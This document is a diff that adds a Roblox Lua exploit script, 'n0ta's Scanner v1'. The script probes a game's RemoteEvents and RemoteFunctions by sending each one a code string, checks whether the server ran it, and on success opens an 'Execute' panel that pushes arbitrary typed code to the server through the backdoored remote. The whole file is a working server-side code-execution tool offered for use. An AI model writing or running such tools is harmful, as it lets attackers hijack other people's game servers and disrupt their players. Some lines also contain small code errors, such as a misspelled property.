@@ -1,0 +1,280 @@
+local TweenService = game:GetService("TweenService")
+local targetSize = UDim2.new(0.3, 0, 0.5, 0)
+local tweenInfo = TweenInfo.new(0.4)
+
+
+
+
+
+
+
+
+
+
+
+function notify(title, msg)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = msg,
+        Duration = 5
+    })
+end
+
+
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "patrickGui"
+gui.Parent = game.CoreGui
+
+local remote = nil
+
+local ScanFrame = Instance.new("Frame")
+ScanFrame.Size = UDim2.new(0.1, 0, 0.1, 0)
+ScanFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
+ScanFrame.BackgroundColor3 = Color3.new(0,0,0)
+ScanFrame.BorderColor3 = Color3.new(0, 0, 0)
+ScanFrame.BorderSizePixel = 1
+ScanFrame.Active = true
+ScanFrame.BackgroundTransparency = 0 
+ScanFrame.Draggable = true
+ScanFrame.Parent = gui
+
+local tween = TweenService:Create(ScanFrame, tweenInfo, {Size = targetSize})
+
+
+
+
+
+local SFT1 = Instance.new("TextLabel")
+SFT1.Size = UDim2.new(0.3, 0, 0.2, 0)
+SFT1.Position = UDim2.new(0.1, 0, 0.02, 0)
+SFT1.BackgroundColor3 = Color3.new(0, 0, 0)
+SFT1.BorderColor3 = Color3.new(0, 0, 0)
+SFT1.BorderSizePixel = 1
+SFT1.Text = "n0ta's Scanner v1"
+SFT1.BackgroundTransparency = 0 
+SFT1.TextColor3 = Color3.new(255, 255, 255)
+SFT1.Font = Enum.Font.Cartoon
+SFT1.Parent = ScanFrame
+SFT1.TextSize = 13
+
+
+
+local ScanBT = Instance.new("TextButton")
+ScanBT.Size = UDim2.new(0.4, 0, 0.2, 0)
+ScanBT.Position = UDim2.new(0.3, 0, 0.4, 0)
+ScanBT.BackgroundColor3 = Color3.new(1,1,1)
+ScanBT.BorderColor3 = Color3.new(0, 0, 0)
+ScanBT.BorderSizePixel = 1
+ScanBT.Text = "Scan"
+ScanBT.BackgroundTransparency = 0 
+ScanBT.TextColor3 = Color3.new(0,0,0)
+ScanBT.Font = Enum.Font.SourceSansBold
+ScanBT.Parent = ScanFrame
+ScanBT.TextSize = 17
+ScanBT.MouseButton1Down:Connect(function()
+  SAV()
+end)
+
+local SBC = Instance.new("UICorner")
+SBC.CornerRadius = UDim.new(0, 5)
+SBC.Parent = ScanBT
+
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.3, 0, 0.5, 0)
+frame.Position = UDim2.new(0.3, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.new(0,0,0)
+frame.BorderColor3 = Color3.new(0, 0, 0)
+frame.BorderSizePixel = 1
+frame.Active = true
+frame.BackgroundTransparency = 0 
+frame.Draggable = true
+frame.Parent = gui
+frame.Visible = false
+
+local no = Instance.new("TextLabel")
+no.Size = UDim2.new(1.0, 0, 0.1, 0)
+no.Position = UDim2.new(0.0, 0, 0.0, 0)
+no.BackgroundColor3 = Color3.new(1, 0, 0)
+no.BorderColor3 = Color3.new(0, 0, 0)
+no.BorderSizePixel = 1
+no.Text = "n0ta's scanner"
+no.BackgroundTransparency = 1
+no.TextColor3 = Color3.new(1, 1, 1)
+no.Font = Enum.Font.SourceSansBold
+no.Parent = frame
+no.TextScaled = true
+
+local sf = Instance.new("ScrollingFrame")
+sf.Size = UDim2.new(0.94, 0, 0.70, 0)
+sf.Position = UDim2.new(0.03, 0, 0.12, 0)
+sf.BackgroundColor3 = Color3.fromRGB(13,13,13)
+sf.BorderColor3 = Color3.new(0, 0, 0)
+sf.BorderSizePixel = 1
+sf.Parent = frame
+
+
+sf.BackgroundTransparency = 0 
+
+local box = Instance.new("TextBox")
+box.Size = UDim2.new(0.94, 0, 0.70, 0)
+box.Position = UDim2.new(0.00, 0, 0.0, 0)
+box.BackgroundColor3 = Color3.fromRGB(13,13,13)
+box.BorderColor3 = Color3.new(0, 0, 0)
+box.BorderSizePixel = 1
+box.PlaceholderText = "hi"
+box.TextColor3 = Color3.new(255, 255, 255)
+box.BackgroundTransparency = 0
+box.Font = Enum.Font.Code
+box.TextSize = 15
+box.Parent = sf
+box.TextXAlignment = "Left"
+box.TextYAlignment = "Top"
+box.ClearTextaOnFocus = false
+
+local run = Instance.new("TextButton")
+run.Size = UDim2.new(0.3, 0, 0.14, 0)
+run.Position = UDim2.new(0.0, 0, 0.82, 0)
+run.BackgroundColor3 = Color3.new(0, 0, 0)
+run.BorderColor3 = Color3.new(0, 0, 0)
+run.BorderSizePixel = 1
+run.Text = "Execute"
+run.BackgroundTransparency = 0 
+run.TextColor3 = Color3.new(255, 255, 255)
+run.Font = Enum.Font.Code
+run.Parent = frame
+run.TextScaled = true
+run.MouseButton1Down:Connect(function()
+    if remote:IsA("RemoteEvent") then
+    remote:FireServer(box.Text)
+    elseif remote:IsA("RemoteFunction") then
+        remote:InvokeServer(box.Text)
+    end
+
+
+end)
+
+
+local clr = Instance.new("TextButton")
+clr.Size = UDim2.new(0.3, 0, 0.14, 0)
+clr.Position = UDim2.new(0.31, 0, 0.82, 0)
+clr.BackgroundColor3 = Color3.new(0, 0, 0)
+clr.BorderColor3 = Color3.new(0, 0, 0)
+clr.BorderSizePixel = 1
+clr.Text = "Clear"
+clr.BackgroundTransparency = 0 
+clr.TextColor3 = Color3.new(255, 255, 255)
+clr.Font = Enum.Font.Code
+clr.Parent = frame
+clr.TextScaled = true
+
+
+local UIC = Instance.new("UICorner")
+UIC.CornerRadius = UDim.new(0, 5)
+UIC.Parent = frame
+
+
+local uic1 = Instance.new("UICorner")
+uic1.CornerRadius = UDim.new(0, 5)
+uic1.Parent = run
+
+
+
+
+--///patrick gui maker///--
+local rrs = game:GetService("RobloxReplicatedStorage")
+local rs = game:GetService("ReplicatedStorage")
+local js = game:GetService("JointsService")
+
+
+local scanning = false
+local gotremote = nil
+local rTable = {}
+local bdinstance = nil
+
+function SAV()
+	local rem = nil
+	if not scanning then
+		scanning = true
+		gotremote = nil
+		rTable = {}
+
+		notify("n0ta's scanner v1", "BDLegacy Api\nScanning")
+
+		local targets = {
+			game:GetService("Lighting"),
+			game:GetService("Workspace"),
+			game:GetService("ReplicatedStorage")
+		}
+
+		for _, container in ipairs(targets) do
+			for _, b in ipairs(container:GetDescendants()) do
+				if b:IsA("RemoteEvent") or b:IsA("RemoteFunction") then
+					table.insert(rTable, b)
+				end
+			end
+		end
+
+		for _, v in ipairs(rTable) do
+			if gotremote == nil then
+				local nwh = string.char(
+					0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046, 0x0047, 0x0048,
+					0x0049, 0x004A, 0x004B, 0x004C, 0x004D, 0x004E, 0x004F, 0x0050,
+					0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057, 0x0058,
+					0x0059, 0x005A, 0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046
+				)
+
+				local code = 'Instance.new("Model", workspace).Name="' .. nwh .. '"'
+				rem = v
+
+				if v:IsA("RemoteEvent") then
+					v:FireServer(code)
+				elseif v:IsA("RemoteFunction") then
+					task.spawn(function()
+						v:InvokeServer(code)
+					end)
+				end
+
+				wait(0.6)
+				if workspace:FindFirstChild(nwh) and workspace[nwh]:IsA("Model") then
+					notify("n0ta's scanner", "BDLegacy Api\nInstance Exists")
+					gotremote = v
+				    remote = v
+				end
+			end
+		end
+
+		if gotremote ~= nil then
+		    frame.Visible = true
+			notify("n0ta's scanner v1", "Success! Found Backdoor")
+		else
+			notify("n0ta's scanner", "No Backdoor Found")
+		end
+
+		scanning = false
+	
+	end
+end
+
+  --  Code
+
+
+
+
+
+
+wait(1.7)
+tween:Play()
+
+
+
+
+
+
+-- sep
+
+
+
+
+
